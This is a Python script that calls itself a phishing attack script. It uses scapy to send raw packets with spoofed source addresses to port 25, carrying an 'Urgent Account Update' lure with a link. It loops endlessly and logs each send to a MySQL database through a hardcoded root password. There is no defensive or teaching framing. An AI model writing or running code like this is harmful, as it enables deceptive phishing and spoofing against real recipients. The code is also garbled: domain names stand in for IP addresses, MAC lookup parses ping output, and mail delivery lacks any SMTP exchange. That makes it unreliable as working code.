import random
import time
from scapy.all import *
import mysql.connector
import argparse
import subprocess

# Parse command-line arguments or configuration parameters
parser = argparse.ArgumentParser(description='Phishing attack script')
parser.add_argument('--target-email', type=str, default='target@example.com',
                    help='The target email address (default: target@example.com)')
args = parser.parse_args()
target_email = args.target_email

# Use a list of plausible source email addresses
source_emails = [
    "info@example.com",
    "support@example.com",
    "admin@example.com",
    "contact@example.com",
]

def get_mac_address(ip):
    """
    Get the MAC address of the given IP address using the `arp` command.
    """
    try:
        output = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], universal_newlines=True)
        lines = output.split("\n")
        for line in lines:
            fields = line.split()
            if len(fields) >= 4 and fields[0] == ip:
                return fields[3].replace(".", ":")
        return None
    except subprocess.CalledProcessError:
        return None

db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="Sasori",
    database="honeypot"
)

cursor = db.cursor()

cursor.execute("""
CREATE TABLE phishing_attacks (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target_email VARCHAR(255) NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")
# Batch the inserts to reduce database load
batch_size = 100
batch = []

target_mac = get_mac_address(target_email.split('@')[1])

while True:
    for _ in range(1000):
        # Use a random source email from the list
        email = Ether(src=target_mac, dst=get_mac_address(target_email.split('@')[1]))
        ip = IP(src=random.choice(source_emails).split('@')[1], dst=target_email.split('@')[1])
        tcp = TCP(sport=RandShort(),dport =25)

        # Create a phishing email or link in the payload
        payload = b"Subject: Urgent Account Update\r\n"
        payload += b"From: " + random.choice(source_emails).encode() + b"\r\n"
        payload += b"To: " + target_email.encode() + b"\r\n"
        payload += b"\r\n"
        payload += b"Please click on the following link to update your account information:\r\n"
        payload += b"http://www.example.com/update?email=" + target_email.encode() + b"\r\n"

        # Append the Ethernet layer to the packet
        packet = email/ip/tcp/payload

        send(packet, verbose=0)

        # Add the record to the batch
        batch.append((target_email,))

        # Flush the batch every 100 records
        if len(batch) >= batch_size:
            cursor.executemany("INSERT INTO phishing_attacks (target_email) VALUES (%s)", batch)
            db.commit()
            batch.clear()

        # Add some randomization to the packet rate
        time.sleep(random.uniform(1, 5))

# Flush any remaining records
if batch:
    cursor.executemany("INSERT INTO phishing_attacks (target_email) VALUES (%s)", batch)
    db.commit()

# Close the database connection
cursor.close()
db.close()